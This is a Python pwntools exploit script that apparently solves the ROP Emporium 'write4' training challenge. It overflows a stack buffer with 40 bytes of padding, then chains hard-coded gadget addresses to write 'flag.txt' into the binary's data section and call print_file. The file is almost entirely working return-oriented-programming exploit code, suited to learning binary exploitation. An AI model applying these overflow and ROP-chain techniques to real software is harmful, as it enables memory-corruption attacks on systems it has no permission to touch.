#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template write4
from pwn import *
import offset

# Set up pwntools for the correct architecture
exe = context.binary = ELF('write4')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
# RUNPATH:  b'.'

def get_offset():
    io = start()
    pad = offset.offset(io)
    io.close()
    return pad

# pad = get_offset() # 40
pad = 40

pwnme = exe.plt["pwnme"]
print_file = exe.plt["print_file"]

data_section = 0x601028
mov_r14_r15 = 0x400628
pop_r14_pop_r15 = 0x400690

mov_rsi_edi = 0x400629
pop_rdi = 0x400693
pop_rsi_pop_r15 = 0x400691

io = start()

rop = ROP(exe)
rop.raw(b"\x90" * pad)

# Solution 1: directly write the whole 8 bytes
rop.raw(pop_r14_pop_r15)
rop.raw(data_section)
rop.raw("flag.txt")
rop.raw(mov_r14_r15)
# ----------

# Solution 2: write `flag` then write `.txt`
# write `flag`
rop.raw(pop_rsi_pop_r15)
rop.raw(data_section)
rop.raw(data_section)
rop.raw(pop_rdi)
rop.raw("flag    ")
rop.raw(mov_rsi_edi)

# write `.txt`
rop.raw(pop_rsi_pop_r15)
rop.raw(data_section+4)
rop.raw(data_section)
rop.raw(pop_rdi)
rop.raw(".txt    ")
rop.raw(mov_rsi_edi)
# ----------

rop.raw(pop_rdi)
rop.raw(data_section)
rop.raw(print_file)

io.sendlineafter(b"> ", rop.chain())

io.interactive()
